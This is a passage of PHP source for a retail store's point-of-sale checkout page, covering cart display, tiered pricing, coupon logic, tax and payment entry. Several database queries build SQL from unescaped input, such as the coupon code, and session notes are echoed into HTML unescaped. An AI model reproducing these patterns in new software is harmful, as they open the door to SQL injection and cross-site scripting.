     <style>#productlinksheader a:hover { cursor: pointer; }</style>
     <div class="contentbox">
      <div id="productlinksheader" onclick="$('#productlinks').show();"><a>QUICK CHECKOUT</a></div>
      <div id="productlinks" style="display:none;">
       <div class="couponselector" style="margin:5px 0 0;">
        <button type="button" onclick="window.location.href='/store/index.php?action=submit_checkout&quantity=1&barcode=72716'">Custom Product</button>
        <button type="button" onclick="window.location.href='/store/index.php?action=submit_checkout&quantity=1&barcode=78533'">Tech/Service</button>
        <!--<button type="button" onclick="window.location.href='/store/index.php?action=submit_checkout&quantity=1&barcode=113510'">Gift Card</button>-->
<?php
      echo '<button type="button" onclick="window.location.href=\'/store/index.php?action=submit_checkout&quantity=1&barcode=83893\'">Evike JW Coin Token</button>';
      echo '<button type="button" onclick="window.location.href=\'/store/index.php?action=submit_checkout&quantity=1&barcode=92591\'">HPA Refill</button>';
      echo '<button type="button" onclick="window.location.href=\'/store/index.php?action=submit_checkout&quantity=1&barcode=17717\'">VAR Box</button>';
      echo '<button type="button" onclick="window.location.href=\'/store/index.php?action=submit_checkout&quantity=1&barcode=85888\'">Battery Charging Service</button>';
      echo '<button type="button" onclick="window.location.href=\'/store/index.php?action=submit_checkout&quantity=1&barcode=111956\'">Airsoft Nation Challenge</button>';
?>
       </div>
      </div>
     </div>

<?php
      $cartcounter = 0;
      $serialcounter = 0;
      $checkoutcontent = array();
      $producttotals = array();
      foreach ( $cartproducts as $key => $cartproductdata ) {
        $cartproduct = explode( ',', $cartproductdata );
        if ( $cartproduct[0] < 1 ) { continue; }
        if ( !preg_match( '/^\d{5,6}$/', $cartproduct[1] ) && substr( $cartproduct[1], 0, 5 ) != '72716' && substr( $cartproduct[1], 0, 5 ) != '78533' && substr( $cartproduct[1], 0, 6 ) != '113510' ) { continue; }
        $customid = '';
        if ( substr( $cartproduct[1], 0, 5 ) == '72716' || substr( $cartproduct[1], 0, 5 ) == '78533' || substr( $cartproduct[1], 0, 5 ) == '113510' ) {
          $customid = substr( $cartproduct[1], 6 );
          $cartproduct[1] = substr( $cartproduct[1], 0, 5 );
        }
        $productquery = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $cartproduct[1] . "'" );
        $productinfo = mysqli_fetch_array( $productquery );
        $productprice = getsellprice( $productinfo['products_id'], $customertier, $productinfo['products_price'], $productinfo['manufacturers_discount'] );
        if ( $customprices[$cartproduct[1]] != '' ) { $productprice = $customprices[$cartproduct[1]]; }
        $couponprice = 0;
        $contentkey = $cartcounter;
        if ( $customid != '' ) {
          $customproductname = $productinfo['products_name'];
          $customproductdata = explode( ',', $customproducts[$customid] );
          if ( $customproductdata[1] != '' ) { $customproductname = $customproductdata[1]; }
          if ( $customproductdata[0] != '' ) { $productprice = $customproductdata[0]; }
          else { $customproductname = $productinfo['products_name']; }
          $productimage = '';
          if ( $productinfo['products_image'] != '' ) { $productimage = '<img src="/images/' . $productinfo['products_image'] . '" />'; }
          $checkoutcontent[$contentkey] .= '<tr class="productrow"><td><button type="button" onclick="if(confirm(\'Are you sure you want to remove this in-store only item?\')){location.href=\'/store/index.php?action=remove_checkout_product&remove_pid=' . $productinfo['products_id'] . '-' . $customid . '\';return false;}else{return false;}">&times;</button></td>';
          $checkoutcontent[$contentkey] .= '<td>' . $productinfo['products_id'] . '-' . $customid . '</td>';
          $checkoutcontent[$contentkey] .= '<td>' . $productimage . '</td>';
          $checkoutcontent[$contentkey] .= '<td class="description"><span id="customname' . $customid . '">' . $customproductname . '</span><div id="customnamefield' . $customid . '"><input type="text" name="customname' . $customid . '" value="' . $customproductname . '" /></div></td><td>Store</td>';
          $checkoutcontent[$contentkey] .= '<td class="price"><span id="customprice' . $customid . '">$' . number_format( $productprice, 2 ) . '</span><div id="custompricefield' . $customid . '"><input type="text" name="customprice' . $customid . '" value="' . number_format( $productprice, 2, '.', '' ) . '" onblur="this.value=this.value.replace(/[^0-9.]/g,\'\');" /></div></td>';
          $checkoutcontent[$contentkey] .= '<td>' . $cartproduct[0] . '</td><td>$' . number_format( $productprice * $cartproduct[0], 2 ) . '</td></tr>';
          $checkoutcontent[$contentkey] .= '<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>$( "#customname' . $customid . '" ).click( function(){ $( "#customnamefield' . $customid . '" ).show(); $( "#customnamefield' . $customid . ' input" ).select().focus(); } );</script>';
          $checkoutcontent[$contentkey] .= '<script>$( "#customprice' . $customid . '" ).click( function(){ $( "#custompricefield' . $customid . '" ).show(); $( "#custompricefield' . $customid . ' input" ).select().focus(); } );</script>';
          $couponprice = $productprice;
        }
        else {
          #if ( $productprice == $productinfo['products_price'] || $couponcode == 'BLK2021' ) {
            $couponprice = applycoupon( $productinfo['products_id'], $couponcode, $cartproducts );
            #if ( $productinfo['products_price'] - $couponprice > 0 ) {
            if ( $productprice - $couponprice > 0 ) {
              $producttotals['coupon'] += ( $productprice - $couponprice ) * $cartproduct[0];
#echo '<!-- xxx ' . $productinfo['products_id'] . '|' . $couponprice . ' -->';
            }
          #}
          $productimage = '';
          if ( $productinfo['products_image'] != '' ) { $productimage = '<img src="/images/' . $productinfo['products_image'] . '" />'; }
          $checkoutcontent[$contentkey] .= '<tr class="productrow"><td><button type="button" onclick="if(confirm(\'Are you sure you want to remove PID ' . $productinfo['products_id'] . '?\')){location.href=\'/store/index.php?action=remove_checkout_product&remove_pid=' . $productinfo['products_id'] . '\';return false;}else{return false;}">&times;</button></td>';
          $checkoutcontent[$contentkey] .= '<td><a href="http://www.evike.com/products/' . $productinfo['products_id'] . '/" target="_blank">' . $productinfo['products_id'] . '</a></td>';
          $checkoutcontent[$contentkey] .= '<td>' . $productimage . '</td>';
          $checkoutcontent[$contentkey] .= '<td class="description">' . $productinfo['products_name'];
          if ( in_array( $productinfo['products_id'], array( 83820, 95309, 14845 ) ) ) {
            $checkoutcontent[$contentkey] .= '<br/><span style="color:red;font-size:15px;"><b>Important:</b> This product requires serial numbers to be logged with the purchase. Please enter all serial number(s) in the internal notes below.</span>';
            $serialcounter += $cartproduct[0];
          }
          $checkoutcontent[$contentkey] .= '</td><td>' . $productinfo['products_location2'] . '</td>';
          $checkoutcontent[$contentkey] .= '<td class="price">';
          $checkoutcontent[$contentkey] .= '<span id="custompriced' . $productinfo['products_id'] . '" style="padding:10px 0;">';
          if ( $productprice < $productinfo['products_price'] ) { $checkoutcontent[$contentkey] .= '<strike style="color:#a00;">$' . number_format( $productinfo['products_price'], 2 ) . '</strike><br/>$' . number_format( $productprice, 2 ); }
          else { $checkoutcontent[$contentkey] .= '$' . number_format( $productprice, 2 ); }
          $checkoutcontent[$contentkey] .= '</span>';
          if ( $loginuser == 33 || $loginuser == 14 || $loginuser == 25 ) { # Kuni julie tako
            $checkoutcontent[$contentkey] .= '<div id="custompricedfield' . $productinfo['products_id'] . '"><input type="text" name="custompriced' . $productinfo['products_id'] . '" value="' . number_format( $productprice, 2, '.', '' ) . '" onblur="this.value=this.value.replace(/[^0-9.]/g,\'\');" /></div>';
            $checkoutcontent[$contentkey] .= '<script>$( "#custompriced' . $productinfo['products_id'] . '" ).click( function(){ $( "#custompricedfield' . $productinfo['products_id'] . '" ).show(); $( "#custompricedfield' . $productinfo['products_id'] . ' input" ).select().focus(); } );</script>';
          }
          $checkoutcontent[$contentkey] .= '</td>';
          $checkoutcontent[$contentkey] .= '<td>' . $cartproduct[0] . '</td><td>$' . number_format( $productprice * $cartproduct[0], 2 ) . '</td></tr>';
        }
        $thisproducttax = $salestaxrate;
        $producttotals['subtotal'] += round( $productprice * $cartproduct[0], 2 );
        if ( $taxexempt == true || $productinfo['products_tax_class_id'] == 0 ) { $thisproducttax = 0; }
        if ( $productprice - $couponprice > 0 ) { $producttotals['tax'] += round( round( $couponprice * $cartproduct[0], 2 ) * $thisproducttax / 100, 2 ); echo '<!-- zzz1 ' . $productinfo['products_id'] . ' - ' . $couponprice . ' | ' . round( round( $couponprice * $cartproduct[0], 2 ) * $thisproducttax / 100, 2 ) . ' -->'; }
        else { $producttotals['tax'] += round( round( $productprice * $cartproduct[0], 2 ) * $thisproducttax / 100, 2 ); echo '<!-- zzz2 ' . $producttotals['tax'] . ' -->'; }
        $cartcounter++;
      }
      $checkoutcontent = array_reverse( $checkoutcontent );
      #if ( $checkoutcontent != '' ) {
      if ( !empty( $checkoutcontent ) ) {
        echo '<table class="checkoutproducts">';
        echo '<tr><th>DEL</th><th>PID</th><th colspan="2">Product</th><th>Location</th><th>Price</th><th>Qty</th><th>Total</th></tr>';
        foreach ( $checkoutcontent as $checkoutcontentdata ) { echo $checkoutcontentdata; }
        echo '<tr><td class="totalfield" colspan="7">Subtotal</td><td class="totaldata">$'. number_format( $producttotals['subtotal'], 2 ) . '</td></tr>';
        if ( $producttotals['coupon'] > 0 ) { echo '<tr><td class="totalfield" colspan="7"><b style="color:blue;">' . $couponcode . '</b> Coupon Discount</td><td class="totaldata"><span style="color:blue;">-$'. number_format( $producttotals['coupon'], 2 ) . '</span></td></tr>'; }
        #$producttotals['tax'] = round( ( $producttotals['subtotal'] - $producttotals['coupon'] ) * $salestaxrate / 100, 2 );
        $totaldue = round( $producttotals['subtotal'] - $producttotals['coupon'] + $producttotals['tax'], 2 );
        echo '<tr><td class="totalfield" colspan="7">Tax</td><td class="totaldata">$' . number_format( $producttotals['tax'], 2 ) . '</td></tr>';
        echo '<tr><td class="totalfield" colspan="7">Total</td><td class="totaldata">$' . number_format( $totaldue, 2 ) . '</td></tr>';
        $paymentcounter = 0;
        $balancedue = $totaldue;
        $cashpaid = 0;
        foreach ( $cartpayments as $key => $cartpaymentdata ) {
          $cartpayment = explode( ',', $cartpaymentdata );
          if ( $cartpayment[0] == 'Cash' ) { $cashpaid += $cartpayment['1']; }
          $balancedue -= round( $cartpayment['1'], 2 );
          $paymentcounter++;
        }
        # Auto-add change
        if ( number_format( $balancedue, 2 ) < 0 && $cashpaid > abs( $balancedue ) ) {
          $cartpayments[] = 'Change,' . number_format( $balancedue, 2, '.', '' );
          $_SESSION["cartpayments"] = $cartpayments;
          $balancedue = 0;
        }
        foreach ( $cartpayments as $key => $cartpaymentdata ) {
          $cartpayment = explode( ',', $cartpaymentdata );
          echo '<tr><td class="paymentfield" colspan="7">';
          echo '<button type="button" class="paymentremovebutton" onclick="if(confirm(\'Remove this payment?\')){location.href=\'/store/index.php?action=remove_checkout_payment&remove_payment=' . $key . '\';return false;}else{return false;}">&times;</button> ';
          if ( $cartpayment['1'] < 0 ) {
            if ( $cartpayment[0] == 'Cash' ) { $cartpayment[0] = 'Change'; }
            echo $cartpayment[0];
            if ( $cartpayment[2] != '' ) { echo ' (' . $cartpayment[2] . ')'; }
            echo '</td><td class="paymentdata">$'. number_format( $cartpayment['1'] * -1, 2 ) . '</td></tr>';
          }
          else {
            echo $cartpayment[0];
            if ( $cartpayment[2] != '' ) { echo ' (' . $cartpayment[2] . ')'; }
            echo '</td><td class="paymentdata">-$'. number_format( $cartpayment['1'], 2 ) . '</td></tr>';
          }
        }
        if ( $paymentcounter > 0 ) {
          $negsign = '';
          $tdstyle = '';
          if ( number_format( $balancedue, 2 ) < 0 ) { $negsign = '-'; }
          elseif ( number_format( $balancedue, 2 ) > 0 ) { $tdstyle = ' style="color:#f00;"'; }
          echo '<tr><td class="balancefield" colspan="7">Balance Due</td><td class="balancedata"' . $tdstyle . '>' . $negsign . '$'. number_format( abs( $balancedue ), 2 ) . '</td></tr>';
          if ( number_format( $balancedue, 2 ) > 0 ) { echo '<input type="hidden" name="outstandingbalance" id="outstandingbalance" value="' . number_format( $balancedue, 2, '.', '' ) . '" />'; }
        }
        else { echo '<input type="hidden" name="outstandingbalance" id="outstandingbalance" value="' . number_format( $totaldue, 2, '.', '' ) . '" />'; }
        echo '</table>';
      }
      else { echo '<h4 style="color:green;">Ready to scan</h4>'; }
      #if ( $paymentcounter > 0 && number_format( $balancedue, 2 ) == 0 && ( $requiredisclaimer == false || $dlid != '' ) && ( $requireleid == false || $leid != '' ) && ( $_SESSION["customerid"] != $employeepurchaseaccount || $_SESSION["employeepurchase"] != '' ) && ( ( $serialcounter > 1 && $serialcounter <= count( preg_split( '/\n|\r/', $_SESSION['ordernotes'] ) ) ) || ( $serialcounter == 1 && $_SESSION['ordernotes'] != '' ) || $serialcounter == 0 ) ) {
      if ( $paymentcounter > 0 && number_format( $balancedue, 2 ) == 0 && ( $requiredisclaimer == false || $dlid != '' ) && ( $requireleid == false || $leid != '' ) && ( $_SESSION["customerid"] != $employeepurchaseaccount || $_SESSION["employeepurchase"] != '' ) && ( $_SESSION["customerid"] != $drinkspurchaseaccount || $_SESSION["employeepurchase"] != '' ) && ( $_SESSION["customerid"] != 1194423 || $_SESSION["employeepurchase"] != '' ) && ( $_SESSION["customerid"] != 1200305 || $_SESSION["employeepurchase"] != '' ) ) {
        echo '<button name="saveButton" onclick="if(confirm(\'Finalize order and save to system?\')){$(\'.ordersavebutton\').hide();location.href=\'/store/index.php?action=save_order\';return false;}else{return false;}" class="ordersavebutton">Process Order</button>';
      }
      elseif ( number_format( $balancedue, 2 ) <> 0 ) {
?>
     <div class="contentbox">
      <h2>Payment Information</h2>
<?php
        $terms = false;
        $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_id='" . (int)$_SESSION['customerid'] . "'" );
        $customerinfo = mysqli_fetch_array( $customerquery );
        if ( preg_match( '/^Net /', $customerinfo['customers_terms'] ) ) {
          if ( $customerinfo['customers_terms_total'] > 0 ) {
            $termstotal = 0;
            $orders_query = mysqli_query( $link, "SELECT o.*, ot.value FROM orders o LEFT JOIN orders_total ot ON o.orders_id=ot.orders_id WHERE ot.class='ot_total' AND o.orders_payments_reconciled=0 AND o.date_purchased>='2017-10-01 00:00:00' AND o.payment_method LIKE 'net%' AND o.orders_status NOT IN ( 20 ) AND o.orders_type='' AND o.customers_id='" . (int)$_SESSION['customerid'] . "' ORDER BY o.date_purchased ASC" );
            while ( $orders_data = mysqli_fetch_array( $orders_query ) ) { $termstotal += $orders_data['value']; }
            echo '<p>Customer has ' . $customerinfo['customers_terms'] . ' terms with a limit of $' . number_format( $customerinfo['customers_terms_total'], 2 ) . '.';
            if ( $termstotal > 0 ) { echo ' Current utilization is $' . number_format( $termstotal, 2 ) . '.'; }
            echo '</p>';
            if ( $termstotal >= $customerinfo['customers_terms_total'] ) { echo '<p>Payment terms currently exceeded for account, customer needs to make payment on the account in order to utilize terms.</p>'; }
            elseif ( $termstotal + $totaldue >= $customerinfo['customers_terms_total'] ) { echo '<p>Order exceeds payment terms for account, customer needs to make a payment on the account or reduce the order size to place an order with terms.</p>'; }
            else { $terms = true; }
          }
          else { echo '<p>Payment terms has not been set up for customer account. Have customer contact wholesale department to complete payment terms setup.</p>'; }
        }
?>
      <table class="checkoutpayment">
       <tr>
        <td>Payment Method</td>
        <td>
         <input type="hidden" name="payment_method" id="paymentmethodinput" value="" />
         <div class="couponselector">
          <style>
           .couponselector button.paycc, .couponselector button.paycash, .couponselector button.paysc, .couponselector button.paygc, .couponselector button.payterms { padding: 12px 18px; font-size: 18px; }
           .couponselector button.paycc { background: #fee; border: 1px dotted #b88; }
           .couponselector button.paycc.selected { background: #962828; border: 1px solid #962828; }
           .couponselector button.paycash { background: #efe; border: 1px dotted #8b8; }
           .couponselector button.paycash.selected { background: #289628; border: 1px solid #289628; }
           .couponselector button.paysc { background: #eef; border: 1px dotted #88b; }
           .couponselector button.paysc.selected { background: #285596; border: 1px solid #285596; }
           .couponselector button.paygc { background: #eee; border: 1px dotted #888; }
           .couponselector button.paygc.selected { background: #282828; border: 1px solid #282828; }
           .wholesaleterminal { border: 2px solid #444; padding: 6px; background: #f59696; }
          </style>
          <?php
            if ( $terms == true ) { ?>
          <button type="button" class="payterms" onclick="$(this).addClass('selected');$(this).siblings().removeClass('selected');$('#paymentmethodinput').val('<?php echo $customerinfo['customers_terms']; ?>');$('#paymentamountinput').val('');$('#ccauthdiv').hide();$('#screasondiv').hide();$('#gcnumberdiv').hide();return false;"><i class="lgicon fa fa-share"></i> <?php echo $customerinfo['customers_terms']; ?></button>
          <?php } ?>
          <button type="button" class="paycc" onclick="$(this).addClass('selected');$(this).siblings().removeClass('selected');$('#paymentmethodinput').val('Credit Card');$('#paymentamountinput').val($('#outstandingbalance').val());$('#ccauthdiv').show();$('#screasondiv').hide();$('#gcnumberdiv').hide();return false;" style="border-color:background:#fee;"><i class="lgicon fab fa-cc-visa"></i> Credit Card</button>
          <button type="button" class="paycash" onclick="$(this).addClass('selected');$(this).siblings().removeClass('selected');$('#paymentmethodinput').val('Cash');$('#paymentamountinput').val('');$('#ccauthdiv').hide();$('#screasondiv').hide();$('#gcnumberdiv').hide();return false;"><i class="lgicon fa fa-money-bill-alt"></i> Cash</button>
          <button type="button" class="paysc" onclick="$(this).addClass('selected');$(this).siblings().removeClass('selected');$('#paymentmethodinput').val('Store Credit');$('#paymentamountinput').val('');$('#ccauthdiv').hide();$('#screasondiv').show();$('#gcnumberdiv').hide();return false;"><i class="lgicon fa fa-shopping-cart"></i> Store Credit</button>
          <button type="button" class="paygc" onclick="$(this).addClass('selected');$(this).siblings().removeClass('selected');$('#paymentmethodinput').val('Gift Card');$('#paymentamountinput').val('');$('#ccauthdiv').hide();$('#screasondiv').hide();$('#gcnumberdiv').show();return false;"><i class="lgicon fa fa-gift"></i> Gift Card</button>
         </div>
        </td>
       </tr>
       <tr>
        <td>Payment Amount</td>
        <td>$<input type="text" name="payment_amount" id="paymentamountinput" value="" placeholder="" style="width:150px;" pattern="[0-9.-]*" onblur="if($('#paymentmethodinput').val()=='Store Credit'){this.value=this.value.replace(/[^0-9.]/g,'');}else{this.value=this.value.replace(/[^0-9.-]/g,'');}" onkeyup="if($('#paymentmethodinput').val()=='Store Credit'){this.value=this.value.replace(/[^0-9.]/g,'');}else{this.value=this.value.replace(/[^0-9.-]/g,'');}" />
         <div style="display:inline-block;">
          <?php if ( $customertier > 0 && !in_array( $customerid, array( 1194423, 1200305 ) ) ) { ?><div id="ccauthdiv" style="display:none;" class="wholesaleterminal"><input type="text" name="ccauth" value="" placeholder="Last 4 of Card Number" /> <span style="padding:0 5px;font-size:20px;font-weight:bold;text-transform:uppercase;">Wholesale Terminal</span></div><?php } else { ?><div id="ccauthdiv" style="display:none;"><input type="text" name="ccauth" value="" placeholder="Last 4 of Card Number" /> <span style="font-size:20px;">Retail Terminal</span></div><?php } ?>
          <div id="screasondiv" style="display:none;"><input type="text" name="screason" value="" placeholder="Store Credit Reason" /></div>
          <div id="gcnumberdiv" style="display:none;"><input type="text" name="gcnumber" value="" placeholder="Gift Card Number" /></div>
         </div>
        </td>
       </tr>
      </table>
      <button>Apply Payment</button>
      <div class="ordernotes">
       <?php if ( $serialcounter > count( preg_split( '/\n|\r/', $_SESSION['ordernotes'] ) ) || ( $serialcounter > 0 && $_SESSION['ordernotes'] == '' ) ) { echo '<h4 style="color:red;">Serial numbers required for all quantities of specified product(s) above.<br/>Please enter each serial number on its own line in the internal notes field below.</h4>'; } ?>
       <input type="text" name="ponumber" value="<?php echo $_SESSION['ponumber']; ?>" placeholder="PO Number" />
       <textarea name="ordernotes" placeholder="Internal Notes" style="font-size:16px;"><?php echo $_SESSION['ordernotes']; ?></textarea>
      </div>
     </div>
<?php
        if ( strtotime( "now" ) > strtotime( "2019-10-19 00:00:00" ) && strtotime( "now" ) < strtotime( "2019-10-20 00:00:00" ) ) { // Airsoftcon
          $couponcontent = '';
          if ( $couponcode == 'airsoftcon' ) { $couponcontent .= '<button type="button" class="selected" onclick="return false;">airsoftcon</button>'; }
          echo '<div class="couponselector">' . $couponcontent . '<input type="text" name="couponcode" id="couponcodefield" value="" /></div>';
        }
        elseif ( $customertier == 0 ) {
          $couponcontent = '';
          #$couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_status=1 AND coupons_discount_amount>0 AND ( coupons_discount_type='percent' OR coupons_discount_type='fixed' ) AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_min_order<'" . $totaldue . "' AND coupons_number_available>0 AND ( coupons_show=1 OR coupons_id='TENDOLLARSOFF' )" );
          #$couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_status=1 AND coupons_discount_amount>0 AND coupons_discount_type='percent' AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_min_order<'" . $totaldue . "' AND coupons_number_available>0 AND coupons_show=1 AND coupons_store_only<2" );
          $couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_status=1 AND coupons_discount_amount>0 AND coupons_discount_type='percent' AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_min_order<'" . $totaldue . "' AND coupons_number_available>0 AND ( coupons_store_only=1 OR coupons_show=1 ) AND coupons_store_only<2 AND coupons_id NOT IN ( 'serve', 'evikecom' )" );
          while ( $couponinfo = mysqli_fetch_array( $couponquery ) ) {
            if ( $couponinfo['coupons_id'] == $couponcode ) { $couponcontent .= '<button type="button" class="selected" onclick="return false;">' . $couponinfo['coupons_id'] . '</button>'; }
            else { $couponcontent .= '<button onclick="$(\'#couponcodefield\').val(\'' . $couponinfo['coupons_id'] . '\');this.form.submit();">' . $couponinfo['coupons_id'] . '</button>'; }
          }
          #if ( $couponcontent != '' ) { echo '<div class="couponselector"><input type="hidden" name="couponcode" id="couponcodefield" value="" />' . $couponcontent . '</div>'; }
          echo '<div class="couponselector">' . $couponcontent . '<input type="text" name="couponcode" id="couponcodefield" value="" /></div>';
        }
      }
      elseif ( $serialcounter > count( preg_split( '/\n|\r/', $_SESSION['ordernotes'] ) ) || ( $serialcounter > 0 && $_SESSION['ordernotes'] == '' ) ) {
?>
     <div class="contentbox">
      <h2>Order Information</h2>
      <h4 style="color:red;">Serial numbers required for all quantities of specified product(s) above.<br/>Please enter each serial number on its own line in the internal notes field below.</h4>
      <div class="ordernotes">
       <input type="text" name="ponumber" value="<?php echo $_SESSION['ponumber']; ?>" placeholder="PO Number" />
       <textarea name="ordernotes" placeholder="Internal Notes" style="font-size:16px;"><?php echo $_SESSION['ordernotes']; ?></textarea>
      </div>
      <button>Save</button>
     </div>
<?php
      }
?>
    </form>
   </div>
   <div style="margin:0 0 15px;overflow:auto;"><button type="button" class="clearorder" onclick="if(confirm('Clear order?')){location.href='/store/index.php?action=clear_checkout';return false;}else{return false;}">Clear Order</button></div>
  </div>
<?php
    }
  }
}
?>
 </body>
</html>
<?php
function getsellprice( $product_id, $tier, $products_price, $manufacturer_discount ) {
  global $link, $customerid;
  $sellprice = $products_price;
  if ( $tier > 0 ) {
    $wholesale_price_query = mysqli_query( $link, "SELECT customers_group_price FROM products_groups WHERE products_id='" . $product_id . "' AND customers_group_id='" . $tier . "'" );
    $wholesale_price_info = mysqli_fetch_array( $wholesale_price_query );
    $sellprice = $wholesale_price_info['customers_group_price'];
  }
  //else {
    $epic_price_query = mysqli_query( $link, "SELECT specials_new_products_price FROM specials_00 WHERE products_id='" . $product_id . "' AND status=1" );
    $epic_price_info = mysqli_fetch_array( $epic_price_query );
    if ( $epic_price_info['specials_new_products_price'] > 0 && $epic_price_info['specials_new_products_price'] < $sellprice ) { $sellprice = $epic_price_info['specials_new_products_price']; }
  //}
  $special_price_query = mysqli_query( $link, "SELECT specials_new_products_price FROM specials WHERE products_id='" . $product_id . "' AND status=1" );
  $special_price_info = mysqli_fetch_array( $special_price_query );
  if ( $special_price_info['specials_new_products_price'] > 0 && $special_price_info['specials_new_products_price'] < $sellprice ) { $sellprice = $special_price_info['specials_new_products_price']; }
  $special_pos_price_query = mysqli_query( $link, "SELECT specials_new_products_price FROM specials_pos WHERE products_id='" . $product_id . "' AND status=1" );
  $special_pos_price_info = mysqli_fetch_array( $special_pos_price_query );
  if ( $special_pos_price_info['specials_new_products_price'] > 0 && $special_pos_price_info['specials_new_products_price'] < $sellprice ) { $sellprice = $special_pos_price_info['specials_new_products_price']; }
  if ( $tier == 0 && $manufacturer_discount > 0 && $sellprice == $products_price ) {
    $sellprice = round( $sellprice * ( 100 - $manufacturer_discount ) / 100, 2 );
  }
  # AirsoftCON event pricing
  if ( strtotime( "now" ) > strtotime( "2019-10-19 00:00:00" ) && strtotime( "now" ) < strtotime( "2019-10-20 00:00:00" ) ) {
    $event_pricing_query = mysqli_query( $link, "SELECT * FROM products_pricing_event WHERE event='airsoftcon-2019' AND products_id='" . $product_id . "'" );
    $event_pricing_info = mysqli_fetch_array( $event_pricing_query );
    if ( $event_pricing_info['products_price'] > 0 && $event_pricing_info['products_price'] < $sellprice ) { $sellprice = $event_pricing_info['products_price']; }
  }
  if ( $customerid > 0 ) {
    $custom_price_query = mysqli_query( $link, "SELECT * FROM products_pricing_customer WHERE products_id='" . $product_id . "' AND customers_id='" . $customerid . "'" );
    $custom_price_info = mysqli_fetch_array( $custom_price_query );
    if ( $custom_price_info['products_price'] > 0 && $custom_price_info['products_price'] < $sellprice ) { $sellprice = $custom_price_info['products_price']; }
    echo '<!-- ccs test ' . $sellprice . ' -->';
  }
  return $sellprice;
}
function applycoupon( $product_id, $coupon_id, $cartproducts = array() ) {
  global $link, $customertier;
  #$pricequery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $product_id . "'" );
  $pricequery = mysqli_query( $link, "SELECT p.*, m.manufacturers_discount FROM products p LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $product_id . "'" );
  $priceresult = mysqli_fetch_array( $pricequery );
  if ( iscouponvalid( $product_id, $coupon_id ) && $product_id != '72716' && $product_id != '78533' && $product_id != '113510' ) {
    #$couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_id='" . $coupon_id . "' AND coupons_status=1 AND coupons_discount_amount>0 AND coupons_discount_type='percent' AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_number_available>0 AND ( coupons_outpost_id='9999' OR coupons_outpost_id=0 OR coupons_store_only=0 )" );
    $couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_id='" . $coupon_id . "' AND coupons_status=1 AND coupons_discount_amount>0 AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_number_available>0 AND ( coupons_outpost_id='9999' OR coupons_outpost_id=0 OR coupons_store_only=0 )" );
    $couponinfo = mysqli_fetch_array( $couponquery );
    if ( $couponinfo['coupons_id'] == $coupon_id && $couponinfo['coupons_discount_type'] == 'percent' ) {
      if ( $couponinfo['coupons_id'] == 'AirsoftCON2017' ) {
        $specialdiscount = false;
        $specialcats = array();
        $catquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=27 AND categories_id NOT IN ( 133 )" );
        while ( $catinfo = mysqli_fetch_array( $catquery ) ) {
          $specialcats[] = $catinfo['categories_id'];
          $subcatquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=" . $catinfo['categories_id'] );
          while ( $subcatinfo = mysqli_fetch_array( $subcatquery ) ) {
            $specialcats[] = $subcatinfo['categories_id'];
            $subsubcatquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=" . $subcatinfo['categories_id'] );
            while ( $subsubcatinfo = mysqli_fetch_array( $subsubcatquery ) ) {
              $specialcats[] = $subsubcatinfo['categories_id'];
              $subsubsubcatquery = mysqli_query( $link, "SELECT categories_id FROM categories WHERE parent_id=" . $subsubcatinfo['categories_id'] );
              while ( $subsubsubcatinfo = mysqli_fetch_array( $subsubsubcatquery ) ) { $specialcats[] = $subsubsubcatinfo['categories_id']; }
            }
          }
        }
        $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . (int)$product_id . "'" );
        while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $specialcats ) ) { $specialdiscount = true; } }
        $mapquery = mysqli_query( $link, "SELECT manufacturers_map FROM manufacturers WHERE manufacturers_id='" . (int)$priceresult['manufacturers_id'] . "'" );
        $mapresult = mysqli_fetch_array( $mapquery );
        if ( $specialdiscount == true ) { return round( $priceresult['products_price'] * ( 1 - 0.30 ), 2 ); }
        elseif ( $mapresult['manufacturers_map'] == 'Enforced' || $priceresult['products_map'] == 1 ) { return round( $priceresult['products_price'] * ( 1 - 0.18 ), 2 ); }
        else { return round( $priceresult['products_price'] * ( 1 - $couponinfo['coupons_discount_amount'] ), 2 ); }
      }
      elseif ( $couponinfo['coupons_id'] == 'serve' ) {
        $mapquery = mysqli_query( $link, "SELECT manufacturers_map FROM manufacturers WHERE manufacturers_id='" . (int)$priceresult['manufacturers_id'] . "'" );
        $mapresult = mysqli_fetch_array( $mapquery );
        if ( $mapresult['manufacturers_map'] == 'Enforced' || $priceresult['products_map'] == 1 ) { return round( $priceresult['products_price'] * ( 1 - 0.10 ), 2 ); }
        else { return round( $priceresult['products_price'] * ( 1 - $couponinfo['coupons_discount_amount'] ), 2 ); }
      }
      elseif ( $couponinfo['coupons_id'] == 'FredHall2020' ) {
        $fishingcats = array( 1076, 1077, 1209, 1080, 1031, 1081, 1079, 1118, 1078 );
        $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . (int)$product_id . "'" );
        while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $fishingcats ) ) { return round( $priceresult['products_price'] * ( 1 - 0.20 ), 2 ); } }
      }
      elseif ( $couponinfo['coupons_map_discount'] >= 0.0001 ) {
